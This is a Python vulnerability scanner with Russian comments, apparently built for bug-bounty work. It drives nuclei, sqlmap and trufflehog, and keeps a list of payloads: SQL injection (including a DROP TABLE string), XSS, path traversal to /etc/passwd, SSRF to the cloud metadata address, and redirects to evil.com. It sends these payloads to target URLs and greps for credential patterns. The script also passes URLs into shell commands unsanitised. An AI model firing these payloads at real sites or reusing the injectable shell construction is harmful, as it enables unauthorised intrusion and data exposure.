#!/usr/bin/env python3
import os
import re
import sys
import argparse
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs

# Настройки инструментов
TOOLS = {
    'nuclei': 'nuclei',
    'sqlmap': 'sqlmap',
    'trufflehog': 'trufflehog',
    'gitleaks': 'gitleaks',
    'grep': 'grep',
    'curl': 'curl'
}

# Паттерны для поиска секретов
SECRET_PATTERNS = {
    'api_key': r'["\']?[a-zA-Z0-9_-]{32,45}["\']?',
    'aws_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret': r'[0-9a-zA-Z/+]{40}',
    'github_token': r'ghp_[a-zA-Z0-9]{36}',
    'google_api': r'AIza[0-9A-Za-z\-_]{35}',
    'firebase': r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
    'slack_token': r'xox[baprs]-([0-9a-zA-Z]{10,48})',
    'private_key': r'-----BEGIN PRIVATE KEY-----',
    'ssh_key': r'-----BEGIN OPENSSH PRIVATE KEY-----',
    'database_url': r'(mysql|postgresql|mongodb)://[^\s]+',
    'jwt_token': r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
    'password': r'["\']password["\']\s*[:=]\s*["\'][^"\']+["\']',
    'secret': r'["\']secret["\']\s*[:=]\s*["\'][^"\']+["\']',
    'token': r'["\']token["\']\s*[:=]\s*["\'][^"\']+["\']'
}

# Payloads для тестирования уязвимостей
PAYLOADS = {
    'sqli': [
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' OR '1'='1",
        "admin'--",
        "1' AND 1=1--"
    ],
    'xss': [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        "';alert('XSS');//",
        "<svg onload=alert('XSS')>",
        "';alert(String.fromCharCode(88,83,83))//"
    ],
    'lfi': [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "../../../proc/version",
        "....//....//....//etc/passwd"
    ],
    'ssrf': [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22",
        "http://localhost:3306",
        "http://0.0.0.0:8080",
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/stat"
    ],
    'open_redirect': [
        "https://evil.com",
        "//evil.com",
        "javascript:window.location='https://evil.com'",
        "data:text/html,<script>window.location='https://evil.com'</script>"
    ]
}

def run_command(cmd, output_file=None, timeout=300):
    """Выполняет команду с обработкой ошибок"""
    try:
        print(f"[DEBUG] Выполняется: {cmd}")
        
        if output_file:
            result = subprocess.run(
                cmd, shell=True, text=True, capture_output=True, timeout=timeout
            )
            if result.returncode == 0 and result.stdout:
                with open(output_file, 'w') as f:
                    f.write(result.stdout)
                print(f"[+] Результат сохранен в: {output_file}")
                return result.stdout.strip()
            else:
                print(f"[-] Команда завершилась с ошибкой: {result.stderr}")
                return None
        else:
            result = subprocess.run(
                cmd, shell=True, text=True, capture_output=True, timeout=timeout
            )
            if result.returncode == 0:
                return result.stdout.strip()
            else:
                print(f"[-] Команда завершилась с ошибкой: {result.stderr}")
                return None
                
    except subprocess.TimeoutExpired:
        print(f"[-] Таймаут команды: {cmd}")
        return None
    except Exception as e:
        print(f"[-] Неожиданная ошибка: {e}")
        return None

def check_tools():
    """Проверяет наличие необходимых инструментов"""
    missing_tools = []
    for tool_name, tool_cmd in TOOLS.items():
        try:
            subprocess.run([tool_cmd, '--help'], capture_output=True, timeout=5)
            print(f"[+] {tool_name} найден")
        except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.CalledProcessError):
            print(f"[-] {tool_name} не найден")
            missing_tools.append(tool_name)
    
    if missing_tools:
        print(f"\n[!] Отсутствуют инструменты: {', '.join(missing_tools)}")
        print("[!] Установите их перед запуском скрипта")
        return False
    return True

def extract_params_from_url(url):
    """Извлекает параметры из URL"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return params

def test_sqli_with_sqlmap(url, output_dir):
    """Тестирует SQLi с помощью sqlmap"""
    print(f"[+] Тестирование SQLi для: {url}")
    
    # Создаем уникальное имя для отчета
    url_hash = str(hash(url))[-8:]
    report_file = f"{output_dir}/sqlmap_report_{url_hash}.txt"
    
    cmd = f"{TOOLS['sqlmap']} -u '{url}' --batch --random-agent --level=1 --risk=1 --output-dir={output_dir} --report={report_file}"
    return run_command(cmd, timeout=600)

def test_xss_with_nuclei(url, output_dir):
    """Тестирует XSS с помощью nuclei"""
    print(f"[+] Тестирование XSS для: {url}")
    
    report_file = f"{output_dir}/nuclei_xss_report.txt"
    cmd = f"{TOOLS['nuclei']} -u '{url}' -t xss -o {report_file} -silent"
    return run_command(cmd, timeout=300)

def test_lfi_with_nuclei(url, output_dir):
    """Тестирует LFI с помощью nuclei"""
    print(f"[+] Тестирование LFI для: {url}")
    
    report_file = f"{output_dir}/nuclei_lfi_report.txt"
    cmd = f"{TOOLS['nuclei']} -u '{url}' -t lfi -o {report_file} -silent"
    return run_command(cmd, timeout=300)

def test_ssrf_with_nuclei(url, output_dir):
    """Тестирует SSRF с помощью nuclei"""
    print(f"[+] Тестирование SSRF для: {url}")
    
    report_file = f"{output_dir}/nuclei_ssrf_report.txt"
    cmd = f"{TOOLS['nuclei']} -u '{url}' -t ssrf -o {report_file} -silent"
    return run_command(cmd, timeout=300)

def test_open_redirect_with_nuclei(url, output_dir):
    """Тестирует Open Redirect с помощью nuclei"""
    print(f"[+] Тестирование Open Redirect для: {url}")
    
    report_file = f"{output_dir}/nuclei_redirect_report.txt"
    cmd = f"{TOOLS['nuclei']} -u '{url}' -t redirect -o {report_file} -silent"
    return run_command(cmd, timeout=300)

def scan_for_secrets_in_files(files_dir, output_dir):
    """Сканирует файлы на секреты"""
    print(f"[+] Сканирование секретов в директории: {files_dir}")
    
    secrets_file = f"{output_dir}/secrets_found.txt"
    
    # Используем truffleHog для сканирования (исправленная команда)
    cmd = f"{TOOLS['trufflehog']} {files_dir} --no-update > {secrets_file} 2>/dev/null"
    run_command(cmd, timeout=600)
    
    # Дополнительное сканирование с grep (исправленные паттерны)
    grep_secrets_file = f"{output_dir}/grep_secrets.txt"
    
    # Простые паттерны без сложного экранирования
    simple_patterns = [
        "api_key",
        "AKIA[0-9A-Z]{16}",
        "ghp_[a-zA-Z0-9]{36}",
        "AIza[0-9A-Za-z\\-_]{35}",
        "-----BEGIN PRIVATE KEY-----",
        "-----BEGIN OPENSSH PRIVATE KEY-----",
        "mysql://",
        "postgresql://",
        "mongodb://",
        "password.*=",
        "secret.*=",
        "token.*="
    ]
    
    grep_cmd = f"{TOOLS['grep']} -r"
    for pattern in simple_patterns:
        grep_cmd += f" -e '{pattern}'"
    grep_cmd += f" {files_dir} > {grep_secrets_file} 2>/dev/null"
    
    run_command(grep_cmd, timeout=300)

def scan_with_nuclei_general(urls_file, output_dir):
    """Общее сканирование с nuclei"""
    print(f"[+] Общее сканирование nuclei для всех URL")
    
    report_file = f"{output_dir}/nuclei_general_report.txt"
    cmd = f"{TOOLS['nuclei']} -l {urls_file} -severity critical,high,medium -o {report_file} -silent"
    return run_command(cmd, timeout=900)

def test_manual_payloads(url, output_dir):
    """Тестирует URL с ручными payloads"""
    print(f"[+] Ручное тестирование payloads для: {url}")
    
    results = []
    params = extract_params_from_url(url)
    
    if not params:
        return results
    
    for param_name in params:
        for vuln_type, payloads in PAYLOADS.items():
            for payload in payloads[:3]:  # Тестируем только первые 3 payload
                test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}={payload}")
                
                try:
                    # Простой тест с curl
                    cmd = f"{TOOLS['curl']} -s -o /dev/null -w '%{{http_code}}' '{test_url}'"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0:
                        status_code = result.stdout.strip()
                        if status_code != '404':
                            results.append({
                                'url': test_url,
                                'parameter': param_name,
                                'payload': payload,
                                'vuln_type': vuln_type,
                                'status_code': status_code
                            })
                except:
                    continue
    
    # Сохраняем результаты
    if results:
        manual_results_file = f"{output_dir}/manual_payload_results.txt"
        with open(manual_results_file, 'w') as f:
            for result in results:
                f.write(f"URL: {result['url']}\n")
                f.write(f"Parameter: {result['parameter']}\n")
                f.write(f"Payload: {result['payload']}\n")
                f.write(f"Type: {result['vuln_type']}\n")
                f.write(f"Status: {result['status_code']}\n")
                f.write("-" * 50 + "\n")
    
    return results

def generate_vulnerability_report(output_dir, domain):
    """Генерирует итоговый отчет"""
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    report_file = f"{output_dir}/vulnerability_scan_report_{timestamp}.md"
    
    with open(report_file, 'w', encoding='utf-8') as report:
        report.write(f"# Отчет сканирования уязвимостей: {domain}\n")
        report.write(f"**Дата:** {timestamp}\n\n")
        
        report.write("## Найденные файлы\n")
        for root, dirs, files in os.walk(output_dir):
            for file in files:
                if file.endswith('.txt') or file.endswith('.md'):
                    file_path = os.path.join(root, file)
                    report.write(f"- `{file_path}`\n")
        
        report.write("\n## Рекомендации\n")
        report.write("1. Проверьте все найденные секреты\n")
        report.write("2. Протестируйте потенциальные уязвимости вручную\n")
        report.write("3. Используйте результаты sqlmap для дальнейшего тестирования\n")
        report.write("4. Проверьте отчеты nuclei на критические уязвимости\n")
    
    print(f"[+] Отчет сохранен: {report_file}")
    return report_file

def main():
    parser = argparse.ArgumentParser(description='Сканер уязвимостей для Bug Bounty')
    parser.add_argument('domain', help='Домен для сканирования (например: recon-example.com)')
    parser.add_argument('--urls', default='urls/all_urls.txt', help='Файл с URL для тестирования')
    parser.add_argument('--files', default='files', help='Директория с файлами для сканирования секретов')
    parser.add_argument('--output', default='vuln_scan', help='Директория для результатов')
    parser.add_argument('--threads', type=int, default=5, help='Количество потоков')
    parser.add_argument('--skip-secrets', action='store_true', help='Пропустить поиск секретов')
    parser.add_argument('--skip-sqlmap', action='store_true', help='Пропустить sqlmap')
    parser.add_argument('--skip-nuclei', action='store_true', help='Пропустить nuclei')
    
    args = parser.parse_args()
    
    # Проверка инструментов
    if not check_tools():
        return
    
    # Создание директорий
    os.makedirs(args.output, exist_ok=True)
    
    print(f"\n[=== Начало сканирования уязвимостей для {args.domain} ===]\n")
    
    # Пути к файлам
    def safe_path(base, rel):
        if os.path.isabs(rel) or rel.startswith("./"):
            return rel
        return os.path.join(base, rel)

    urls_file = safe_path(args.domain, args.urls)
    files_dir = safe_path(args.domain, args.files)

    if not os.path.exists(urls_file):
        print(f"[-] Файл с URL не найден: {urls_file}")
        return
    
    # 1. Поиск секретов в файлах
    if not args.skip_secrets and os.path.exists(files_dir):
        try:
            scan_for_secrets_in_files(files_dir, args.output)
        except Exception as e:
            print(f"[-] Ошибка при поиске секретов: {e}")
    
    # 2. Общее сканирование nuclei
    if not args.skip_nuclei:
        try:
            scan_with_nuclei_general(urls_file, args.output)
        except Exception as e:
            print(f"[-] Ошибка при запуске nuclei: {e}")
    
    # 3. Тестирование URL с параметрами
    param_urls_file = os.path.join(args.domain, "urls/param_urls.txt")
    if os.path.exists(param_urls_file):
        print("[+] Тестирование URL с параметрами...")
        try:
            with open(param_urls_file, 'r') as f:
                urls_with_params = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Ошибка при чтении param_urls.txt: {e}")
            urls_with_params = []
        
        # Ограничиваем количество URL для тестирования
        test_urls = urls_with_params[:20]  # Тестируем первые 20 URL
        
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            # SQLi тестирование
            if not args.skip_sqlmap:
                for url in test_urls[:5]:  # sqlmap только для первых 5 URL
                    executor.submit(test_sqli_with_sqlmap, url, args.output)
            
            # Nuclei тестирование
            if not args.skip_nuclei:
                for url in test_urls:
                    executor.submit(test_xss_with_nuclei, url, args.output)
                    executor.submit(test_lfi_with_nuclei, url, args.output)
                    executor.submit(test_ssrf_with_nuclei, url, args.output)
                    executor.submit(test_open_redirect_with_nuclei, url, args.output)
            
            # Ручное тестирование payloads
            for url in test_urls[:10]:  # Ручное тестирование для первых 10 URL
                executor.submit(test_manual_payloads, url, args.output)
    
    # 4. Генерация отчета
    report_file = generate_vulnerability_report(args.output, args.domain)
    
    print(f"\n[=== Сканирование завершено! Отчет: {report_file} ===]")

if __name__ == "__main__":
    main() 